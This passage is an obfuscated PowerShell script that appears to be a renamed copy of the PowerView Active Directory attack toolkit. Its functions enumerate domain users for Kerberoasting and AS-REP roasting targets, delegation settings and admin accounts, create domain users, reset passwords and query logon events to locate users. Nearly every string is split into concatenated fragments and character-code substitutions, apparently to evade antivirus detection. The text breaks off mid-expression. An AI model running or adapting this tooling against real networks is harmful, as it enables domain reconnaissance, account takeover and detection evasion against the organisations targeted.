            &('Write-Ver'+'b'+'ose') ('[Find'+'-'+'DomainO'+'b'+'jectP'+'ro'+'perty'+'Outli'+'er]'+' '+'U'+'sing '+'th'+'e '+'defa'+'ult'+' '+'refer'+'en'+'ce '+'prop'+'erty'+' '+'se'+'t '+'fo'+'r '+'th'+'e '+'o'+'bjec'+'t '+'c'+'las'+'s '+"'$ClassName'")
        }

        if (($ClassName -eq ('U'+'ser')) -or ($ReferenceObjectClass -eq ('Us'+'er'))) {
            $Objects = &('Get'+'-'+'Domai'+'nUser') @SearcherArguments
            if (-not $ReferenceObjectProperties) {
                $ReferenceObjectProperties = $UserReferencePropertySet
            }
        }
        elseif (($ClassName -eq ('Grou'+'p')) -or ($ReferenceObjectClass -eq ('Grou'+'p'))) {
            $Objects = &('Get'+'-Domai'+'n'+'Group') @SearcherArguments
            if (-not $ReferenceObjectProperties) {
                $ReferenceObjectProperties = $GroupReferencePropertySet
            }
        }
        elseif (($ClassName -eq ('Co'+'mput'+'er')) -or ($ReferenceObjectClass -eq ('Co'+'mput'+'er'))) {
            $Objects = &('Get-Do'+'mainCo'+'mpu'+'te'+'r') @SearcherArguments
            if (-not $ReferenceObjectProperties) {
                $ReferenceObjectProperties = $ComputerReferencePropertySet
            }
        }
        else {
            throw ('[Fi'+'nd'+'-Doma'+'i'+'nOb'+'jec'+'tPr'+'ope'+'rty'+'Out'+'lier] '+'Invalid'+' '+'c'+'lass: '+"$ClassName")
        }

        ForEach ($Object in $Objects) {
            $ObjectProperties = &('Get'+'-M'+'embe'+'r') -InputObject $Object -MemberType NoteProperty | &('Sele'+'ct-Ob'+'ject') -Expand Name
            ForEach($ObjectProperty in $ObjectProperties) {
                if ($ReferenceObjectProperties -NotContains $ObjectProperty) {
                    $Out = &('N'+'ew-Objec'+'t') PSObject
                    $Out | &('Add-Me'+'mbe'+'r') Noteproperty ('S'+'a'+'mAcc'+'oun'+'tName') $Object.SamAccountName
                    $Out | &('Add-Me'+'mb'+'er') Noteproperty ('Pr'+'opert'+'y') $ObjectProperty
                    $Out | &('Add-'+'Mem'+'ber') Noteproperty ('V'+'alue') $Object.$ObjectProperty
                    $Out.PSObject.TypeNames.Insert(0, ('Po'+'wer'+'Bla.Pr'+'op'+'ertyOu'+'tli'+'er'))
                    $Out
                }
            }
        }
    }
}



function Get-DomainUser {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSU'+'seDeclare'+'d'+'VarsM'+'o'+'reTh'+'an'+'Assi'+'gnm'+'e'+'nts'), '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSSh'+'ouldP'+'roc'+'es'+'s'), '')]
    [OutputType(('Powe'+'rB'+'l'+'a.Us'+'er'))]
    [OutputType(('PowerBla.U'+'se'+'r.'+'Raw'))]
    [CmdletBinding(DefaultParameterSetName = {'A'+'llowD'+'elegat'+'i'+'on'})]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('Di'+'sti'+'ngu'+'ishedName'), ('Sam'+'Acco'+'u'+'nt'+'Name'), ('Na'+'me'), ('MemberDi'+'stingui'+'shed'+'N'+'ame'), ('M'+'emberN'+'ame'))]
        [String[]]
        $Identity,

        [Switch]
        $SPN,

        [Switch]
        $AdminCount,

        [Parameter(ParameterSetName = "AL`loWd`ElE`G`ATIOn")]
        [Switch]
        $AllowDelegation,

        [Parameter(ParameterSetName = "dISA`l`LoWdeLeGA`T`i`On")]
        [Switch]
        $DisallowDelegation,

        [Switch]
        $TrustedToAuth,

        [Alias(('Ke'+'rberosPreauthNotR'+'e'+'qui'+'re'+'d'), ('NoPrea'+'uth'))]
        [Switch]
        $PreauthNotRequired,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(('Filt'+'er'))]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias(('A'+'D'+'SPath'))]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(('Dom'+'a'+'inCo'+'n'+'tr'+'oller'))]
        [String]
        $Server,

        [ValidateSet(('Bas'+'e'), ('One'+'Lev'+'el'), ('S'+'ubtree'))]
        [String]
        $SearchScope = ('Su'+'btr'+'ee'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet(('D'+'acl'), ('Gr'+'oup'), ('N'+'one'), ('Owne'+'r'), ('Sac'+'l'))]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias(('Return'+'O'+'ne'))]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    DynamicParam {
        $UACValueNames = [Enum]::GetNames($UACEnum)
        $UACValueNames = $UACValueNames | &('F'+'o'+'rEach-O'+'bject') {$_; "NOT_$_"}
        &('New-'+'D'+'y'+'namicParameter') -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
    }

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters[('Dom'+'ai'+'n')]) { $SearcherArguments[('D'+'o'+'main')] = $Domain }
        if ($PSBoundParameters[('P'+'rope'+'r'+'ties')]) { $SearcherArguments[('Proper'+'tie'+'s')] = $Properties }
        if ($PSBoundParameters[('Searc'+'hBa'+'se')]) { $SearcherArguments[('SearchBa'+'s'+'e')] = $SearchBase }
        if ($PSBoundParameters[('Serv'+'er')]) { $SearcherArguments[('Se'+'rve'+'r')] = $Server }
        if ($PSBoundParameters[('Sea'+'rchSco'+'pe')]) { $SearcherArguments[('S'+'e'+'archScope')] = $SearchScope }
        if ($PSBoundParameters[('Resu'+'lt'+'P'+'a'+'geSize')]) { $SearcherArguments[('R'+'esul'+'tPa'+'geS'+'ize')] = $ResultPageSize }
        if ($PSBoundParameters[('ServerTim'+'e'+'Limit')]) { $SearcherArguments[('S'+'e'+'rv'+'erTim'+'eLimit')] = $ServerTimeLimit }
        if ($PSBoundParameters[('Secur'+'ityMa'+'sks')]) { $SearcherArguments[('Securit'+'yMas'+'ks')] = $SecurityMasks }
        if ($PSBoundParameters[('Tom'+'b'+'ston'+'e')]) { $SearcherArguments[('T'+'o'+'mbstone')] = $Tombstone }
        if ($PSBoundParameters[('Cr'+'edenti'+'a'+'l')]) { $SearcherArguments[('Crede'+'n'+'tial')] = $Credential }
        $UserSearcher = &('Get'+'-D'+'o'+'main'+'S'+'earcher') @SearcherArguments
    }

    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            &('New-Dynam'+'i'+'c'+'Para'+'m'+'eter') -CreateVariables -BoundParameters $PSBoundParameters
        }

        if ($UserSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | &('Wher'+'e-Ob'+'ject') {$_} | &('ForEach-Ob'+'jec'+'t') {
                $IdentityInstance = $_.Replace('(', (('By'+'V28').REpLaCE(([ChAr]66+[ChAr]121+[ChAr]86),[STRinG][ChAr]92))).Replace(')', (('P1'+'T29')-CREPLAce([CHAr]80+[CHAr]49+[CHAr]84),[CHAr]92))
                if ($IdentityInstance -match ('^S-'+'1-')) {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match ('^CN'+'=')) {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters[('D'+'o'+'main')]) -and (-not $PSBoundParameters[('Searc'+'h'+'Base')])) {
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf(('D'+'C='))) -replace ('D'+'C='),'' -replace ',','.'
                        &('Write'+'-Ve'+'r'+'bose') ('[Ge'+'t'+'-'+'Do'+'ma'+'inUser] '+'Ext'+'ra'+'cte'+'d '+'dom'+'ain '+"'$IdentityDomain' "+'fro'+'m '+"'$IdentityInstance'")
                        $SearcherArguments[('Do'+'m'+'ain')] = $IdentityDomain
                        $UserSearcher = &('Ge'+'t-Domai'+'nSe'+'arche'+'r') @SearcherArguments
                        if (-not $UserSearcher) {
                            &('Wri'+'t'+'e-Warning') ('[Get-DomainU'+'s'+'er'+'] '+'U'+'n'+'able '+'t'+'o '+'ret'+'rie'+'ve '+'do'+'ma'+'in '+'se'+'arc'+'her '+'fo'+'r '+"'$IdentityDomain'")
                        }
                    }
                }
                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | &('For'+'E'+'ach-Obj'+'ect') { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                elseif ($IdentityInstance.Contains('\')) {
                    $ConvertedIdentityInstance = $IdentityInstance.Replace((('Z'+'zO28').rEpLACe(([CHAR]90+[CHAR]122+[CHAR]79),'\')), '(').Replace((('d'+'23'+'29')  -RePlacE  ([CHAR]100+[CHAR]50+[CHAR]51),[CHAR]92), ')') | &('Co'+'nv'+'ert-ADNa'+'me') -OutputType Canonical
                    if ($ConvertedIdentityInstance) {
                        $UserDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
                        $UserName = $IdentityInstance.Split('\')[1]
                        $IdentityFilter += "(samAccountName=$UserName)"
                        $SearcherArguments[('Do'+'m'+'ain')] = $UserDomain
                        &('Wri'+'te'+'-'+'Verbose') ('[Get-Do'+'mai'+'nUs'+'er] '+'Extr'+'acte'+'d '+'doma'+'in'+' '+"'$UserDomain' "+'fr'+'om '+"'$IdentityInstance'")
                        $UserSearcher = &('Get-Do'+'ma'+'inSearch'+'e'+'r') @SearcherArguments
                    }
                }
                else {
                    $IdentityFilter += "(samAccountName=$IdentityInstance)"
                }
            }

            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters[('S'+'PN')]) {
                &('Write-'+'V'+'er'+'bo'+'se') ('[G'+'et-D'+'oma'+'in'+'User] Search'+'ing for no'+'n-null serv'+'i'+'ce'+' p'+'rincipa'+'l name'+'s')
                $Filter += ('('+'serviceP'+'rinci'+'p'+'a'+'lN'+'am'+'e=*)')
            }
            if ($PSBoundParameters[('A'+'llowDele'+'ga'+'tion')]) {
                &('W'+'rite-'+'Ve'+'rbose') ('['+'Get'+'-Dom'+'ainUs'+'er]'+' Searching'+' fo'+'r users'+' who can'+' be'+' de'+'legated')
                $Filter += ('(!(us'+'e'+'rAccou'+'ntControl:1.'+'2.840.113556.'+'1'+'.'+'4'+'.8'+'03'+':'+'=104857'+'4)'+')')
            }
            if ($PSBoundParameters[('Disallo'+'wDe'+'legat'+'ion')]) {
                &('Write-Ve'+'rbos'+'e') ('['+'Get-DomainU'+'ser] '+'Se'+'a'+'rching for users who are sensi'+'ti'+'ve '+'and '+'n'+'o'+'t '+'trusted fo'+'r'+' d'+'ele'+'g'+'a'+'tion')
                $Filter += ('(u'+'serAccountCont'+'rol:1.2.840'+'.1'+'135'+'5'+'6.1'+'.'+'4'+'.803:='+'1048574)')
            }
            if ($PSBoundParameters[('A'+'dmin'+'Count')]) {
                &('W'+'r'+'i'+'te-Verbose') ('[Get-'+'Do'+'mainU'+'ser'+']'+' Se'+'ar'+'ching'+' for '+'ad'+'minC'+'ount='+'1')
                $Filter += ('(ad'+'mi'+'n'+'count=1)')
            }
            if ($PSBoundParameters[('Tr'+'uste'+'dToAuth')]) {
                &('W'+'r'+'ite-V'+'erbose') ('[G'+'et-Do'+'ma'+'in'+'U'+'ser]'+' S'+'earchi'+'ng'+' for '+'users'+' th'+'at are '+'tr'+'uste'+'d t'+'o a'+'u'+'then'+'ticate fo'+'r oth'+'e'+'r princip'+'a'+'ls')
                $Filter += ('('+'msds-allo'+'wedtod'+'elegate'+'to=*)')
            }
            if ($PSBoundParameters[('P'+'reauthNo'+'tR'+'equ'+'ire'+'d')]) {
                &('Wr'+'ite-Ver'+'bose') ('[Get-Domai'+'nUs'+'e'+'r]'+' Se'+'archi'+'ng for u'+'ser '+'accounts tha'+'t'+' do not require '+'kerb'+'ero'+'s preaut'+'hentica'+'te')
                $Filter += ('(u'+'ser'+'Ac'+'co'+'un'+'t'+'Control:'+'1.2'+'.840.11'+'3'+'556.'+'1'+'.4.'+'803'+':=4194'+'304)')
            }
            if ($PSBoundParameters[('LDA'+'PFilt'+'er')]) {
                &('Wri'+'te-Verb'+'ose') ('['+'Ge'+'t-'+'Domai'+'nUser'+'] '+'Usin'+'g '+'addit'+'iona'+'l'+' '+'L'+'DAP '+'fil'+'ter'+': '+"$LDAPFilter")
                $Filter += "$LDAPFilter"
            }

            $UACFilter | &('W'+'here-'+'Obj'+'ect') {$_} | &('F'+'or'+'Each-Ob'+'ject') {
                if ($_ -match ('NOT_'+'.*')) {
                    $UACField = $_.Substring(4)
                    $UACValue = [Int]($UACEnum::$UACField)
                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    $UACValue = [Int]($UACEnum::$_)
                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            $UserSearcher.filter = "(&(samAccountType=805306368)$Filter)"
            &('W'+'rite'+'-Verbose') "[Get-DomainUser] filter string: $($UserSearcher.filter) "

            if ($PSBoundParameters[('F'+'indO'+'ne')]) { $Results = $UserSearcher.FindOne() }
            else { $Results = $UserSearcher.FindAll() }
            $Results | &('Where-Ob'+'j'+'e'+'ct') {$_} | &('For'+'Eac'+'h-Objec'+'t') {
                if ($PSBoundParameters[('Ra'+'w')]) {
                    $User = $_
                    $User.PSObject.TypeNames.Insert(0, ('PowerBla.Us'+'er'+'.R'+'aw'))
                }
                else {
                    $User = &('Co'+'nvert-LDAPPr'+'opert'+'y') -Properties $_.Properties
                    $User.PSObject.TypeNames.Insert(0, ('Po'+'w'+'erBla.'+'U'+'ser'))
                }
                $User
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    &('W'+'rite-Ve'+'rbos'+'e') ('[Get-Domai'+'nUs'+'e'+'r] '+'Er'+'ror '+'disp'+'osin'+'g '+'of'+' '+'th'+'e '+'Results'+' '+'obj'+'ect:'+' '+"$_")
                }
            }
            $UserSearcher.dispose()
        }
    }
}


function New-DomainUser {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PS'+'U'+'seShould'+'Pro'+'cessF'+'o'+'r'+'S'+'tat'+'eC'+'hangingFunc'+'tio'+'ns'), '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PS'+'Sh'+'ouldPr'+'ocess'), '')]
    [OutputType(('DirectoryService'+'s.Acc'+'ountMana'+'gement.'+'U'+'s'+'er'+'P'+'ri'+'ncipal'))]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $SamAccountName,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias(('Pas'+'sw'+'ord'))]
        [Security.SecureString]
        $AccountPassword,

        [ValidateNotNullOrEmpty()]
        [String]
        $Name,

        [ValidateNotNullOrEmpty()]
        [String]
        $DisplayName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Description,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $ContextArguments = @{
        ('I'+'d'+'entity') = $SamAccountName
    }
    if ($PSBoundParameters[('Doma'+'in')]) { $ContextArguments[('D'+'omain')] = $Domain }
    if ($PSBoundParameters[('Cred'+'e'+'n'+'tial')]) { $ContextArguments[('Cr'+'ede'+'ntial')] = $Credential }
    $Context = &('G'+'e'+'t-P'+'r'+'incipalCon'+'te'+'xt') @ContextArguments

    if ($Context) {
        $User = &('N'+'e'+'w-Object') -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context.Context)

        $User.SamAccountName = $Context.Identity
        $TempCred = &('New-O'+'b'+'jec'+'t') System.Management.Automation.PSCredential('a', $AccountPassword)
        $User.SetPassword($TempCred.GetNetworkCredential().Password)
        $User.Enabled = $True
        $User.PasswordNotRequired = $False

        if ($PSBoundParameters[('Nam'+'e')]) {
            $User.Name = $Name
        }
        else {
            $User.Name = $Context.Identity
        }
        if ($PSBoundParameters[('Displ'+'ayNa'+'me')]) {
            $User.DisplayName = $DisplayName
        }
        else {
            $User.DisplayName = $Context.Identity
        }

        if ($PSBoundParameters[('De'+'script'+'ion')]) {
            $User.Description = $Description
        }

        &('Write'+'-'+'Verbo'+'se') ('['+'Ne'+'w-Do'+'mainUser] '+'Attem'+'pting'+' '+'to'+' '+'cre'+'at'+'e '+'u'+'ser '+"'$SamAccountName'")
        try {
            $Null = $User.Save()
            &('Writ'+'e-'+'Ver'+'bose') ('[New-Domai'+'nUse'+'r'+'] '+'Us'+'er '+"'$SamAccountName' "+'su'+'c'+'cessf'+'ully '+'c'+'reate'+'d')
            $User
        }
        catch {
            &('Write-'+'Wa'+'r'+'ning') ('[New'+'-Doma'+'inUse'+'r'+']'+' '+'Err'+'o'+'r '+'c'+'reating'+' '+'user'+' '+"'$SamAccountName' "+': '+"$_")
        }
    }
}


function Set-DomainUserPassword {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSU'+'s'+'eShouldProcessFo'+'rStateCh'+'a'+'n'+'gi'+'n'+'gFunc'+'tions'), '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSS'+'houldPro'+'cess'), '')]
    [OutputType(('Di'+'re'+'ctor'+'yS'+'ervices.Acco'+'untMana'+'ge'+'m'+'e'+'nt.User'+'Princ'+'i'+'pal'))]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias(('Us'+'e'+'rName'), ('User'+'Identi'+'ty'), ('Use'+'r'))]
        [String]
        $Identity,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias(('Pass'+'wo'+'rd'))]
        [Security.SecureString]
        $AccountPassword,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $ContextArguments = @{ ('Ident'+'i'+'ty') = $Identity }
    if ($PSBoundParameters[('D'+'omain')]) { $ContextArguments[('Dom'+'ai'+'n')] = $Domain }
    if ($PSBoundParameters[('Cr'+'edent'+'ial')]) { $ContextArguments[('C'+'red'+'e'+'ntial')] = $Credential }
    $Context = &('Ge'+'t'+'-Prin'+'cipalConte'+'x'+'t') @ContextArguments

    if ($Context) {
        $User = [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity($Context.Context, $Identity)

        if ($User) {
            &('Wr'+'i'+'te-'+'Verbose') ('[S'+'et-'+'Domai'+'nUs'+'erPasswo'+'r'+'d] '+'A'+'t'+'tempti'+'ng '+'to'+' '+'s'+'et '+'th'+'e '+'p'+'asswo'+'rd '+'fo'+'r '+'u'+'ser '+"'$Identity'")
            try {
                $TempCred = &('Ne'+'w-Ob'+'ject') System.Management.Automation.PSCredential('a', $AccountPassword)
                $User.SetPassword($TempCred.GetNetworkCredential().Password)

                $Null = $User.Save()
                &('W'+'r'+'it'+'e-V'+'erbose') ('[Set'+'-DomainUserPa'+'ssw'+'or'+'d]'+' '+'Passwo'+'r'+'d '+'f'+'or '+'u'+'ser '+"'$Identity' "+'su'+'cces'+'sful'+'ly '+'r'+'eset')
            }
            catch {
                &('Wr'+'ite-War'+'nin'+'g') ('[S'+'et-'+'Dom'+'a'+'inU'+'serPass'+'word] '+'Erro'+'r'+' '+'se'+'ttin'+'g '+'passwor'+'d '+'f'+'or '+'user'+' '+"'$Identity' "+': '+"$_")
            }
        }
        else {
            &('Write'+'-War'+'nin'+'g') ('['+'Set'+'-Domain'+'Use'+'rPasswo'+'rd'+']'+' '+'U'+'nable '+'t'+'o '+'f'+'ind '+'u'+'ser '+"'$Identity'")
        }
    }
}


function Get-DomainUserEvent {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PS'+'Shou'+'ldProc'+'e'+'ss'), '')]
    [OutputType(('Power'+'B'+'l'+'a.Log'+'onE'+'v'+'ent'))]
    [OutputType(('PowerB'+'l'+'a'+'.E'+'xplici'+'t'+'Credent'+'ialLog'+'onEve'+'nt'))]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('dnshost'+'n'+'ame'), ('H'+'ostNam'+'e'), ('n'+'ame'))]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME,

        [ValidateNotNullOrEmpty()]
        [DateTime]
        $StartTime = [DateTime]::Now.AddDays(-1),

        [ValidateNotNullOrEmpty()]
        [DateTime]
        $EndTime = [DateTime]::Now,

        [ValidateRange(1, 1000000)]
        [Int]
        $MaxEvents = 5000,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $XPathFilter = (('C'+'uY
<Quer'+'yList'+'>
 ').REplAcE('CuY',[StrING][Char]34)+' '+' '+' '+'<Que'+'r'+'y '+(('Id=Gh8'+'0Gh8'+' ')  -CRepLACe  'Gh8',[ChAR]34)+('P'+'ath='+'cE1Securi'+'ty'+'cE1>
'+'
 ').repLaCe(([ChAR]99+[ChAR]69+[ChAR]49),[StRing][ChAR]34)+' '+' '+' '+' '+' '+' '+' '+'<!-'+'- '+'Log'+'on '+'event'+'s '+'-'+'->
 '+' '+' '+' '+' '+' '+' '+' '+'<Se'+'lect '+('Path='+'jB'+'qSecur'+'ityjB'+'q>'+'
 ').RePLAce('jBq',[stRInG][CHar]34)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'*[
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'System['+'
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Prov'+'ide'+'r[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+(('@Name=S'+'rRMicro'+'soft-W'+'i'+'n'+'dows-S'+'ecurity-Au'+'dit'+'in'+'gSrR
 ') -CRePlaCE  'SrR',[CHaR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'an'+'d '+'(Le'+'vel=4'+' '+'o'+'r '+'L'+'evel=0)'+' '+'a'+'nd '+'(E'+'v'+'en'+'tID=4624'+')
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'and'+' '+'Time'+'Cr'+'eate'+'d[
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('@'+'Sys'+'t'+'emTime&gt;'+'=rqkMpD(MpDStartTime.'+'ToUniv'+'ersalTime('+').T'+'oSt'+'ring(r'+'q'+'k'+'srqk))rqk ').REPlaCe(([CHar]77+[CHar]112+[CHar]68),'$').REPlaCe(([CHar]114+[CHar]113+[CHar]107),[stRINg][CHar]39)+'a'+'nd '+('@Sy'+'s'+'temTi'+'me&l'+'t;={0}{'+'1}('+'{1}E'+'n'+'d'+'Time'+'.ToUnive'+'rs'+'al'+'T'+'ime().ToString({0}s{0})){0}
 ') -F[cHAR]39,[cHAR]36+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'an'+'d
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('*['+'EventD'+'ata[D'+'ata[@'+'Na'+'me={0}T'+'ar'+'getU'+'ser'+'Name{0'+'}] ') -F [char]39+'!'+'= '+('{0}ANONY'+'MOU'+'S'+' ')  -f  [ChAR]39+('L'+'OGON'+'{0}]]
 ') -F[cHaR]39+' '+' '+' '+' '+' '+' '+' '+'</'+'Se'+'lect>

'+' '+' '+' '+' '+' '+' '+' '+' '+'<!--'+' '+'Logon'+' '+'w'+'ith '+'expli'+'cit'+' '+'cred'+'en'+'t'+'ial '+'ev'+'ent'+'s '+'-'+'->
 '+' '+' '+' '+' '+' '+' '+' '+'<Sel'+'ect '+('Pa'+'th={'+'0}'+'S'+'ecur'+'ity{0}>
 ') -F  [chaR]34+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'*[
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Syste'+'m['+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Pr'+'ovid'+'er[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('@Name='+'{0}Mic'+'rosoft'+'-Windows-'+'Securi'+'ty-Audi'+'t'+'ing{0}
'+' ')-f  [CHAr]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'and'+' '+'('+'Le'+'vel=4 '+'o'+'r '+'Leve'+'l='+'0) '+'a'+'nd '+'(Event'+'ID'+'=4648'+')
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'and'+' '+'Tim'+'eCrea'+'te'+'d[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+(('@Sy'+'s'+'temTime&gt;'+'=iGse'+'VO(eVOStartTi'+'me.ToU'+'ni'+'versalTime().ToSt'+'ri'+'ng(iG'+'s'+'siG'+'s)'+')i'+'Gs ')-REPlacE  ([CHAr]105+[CHAr]71+[CHAr]115),[CHAr]39-CreplAcE ([CHAr]101+[CHAr]86+[CHAr]79),[CHAr]36)+'and'+' '+('@Sy'+'s'+'temT'+'ime&'+'lt;=l'+'W'+'39'+'3Y'+'('+'93'+'YEn'+'dT'+'ime.'+'To'+'Un'+'iv'+'er'+'salT'+'ime().ToS'+'tring(lW'+'3slW3)'+')'+'lW3
 ').replaCe(([ChaR]108+[ChaR]87+[ChaR]51),[String][ChaR]39).replaCe(([ChaR]57+[ChaR]51+[ChaR]89),'$')+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+'</S'+'elect>

'+' '+' '+' '+' '+' '+' '+' '+' '+'<Supp'+'ress'+' '+('Path={0}'+'Secu'+'r'+'ity{'+'0}'+'>
 ')  -f [CHAR]34+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'*[
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Sy'+'ste'+'m[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Pr'+'ov'+'ider'+'[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+(('@'+'Name'+'=Pj'+'TM'+'icrosoft'+'-Windows-Se'+'cur'+'ity-Au'+'ditingP'+'jT
 ')-RePlacE  ([CHar]80+[CHar]106+[CHar]84),[CHar]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'and
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'('+'Lev'+'el=4 '+'or'+' '+'Level='+'0'+') '+'an'+'d '+'(EventID=462'+'4'+' '+'or'+' '+'Even'+'tI'+'D=4625 '+'o'+'r '+'EventID'+'=463'+'4)'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'and'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'*'+'[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Ev'+'ent'+'Data['+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'('+'
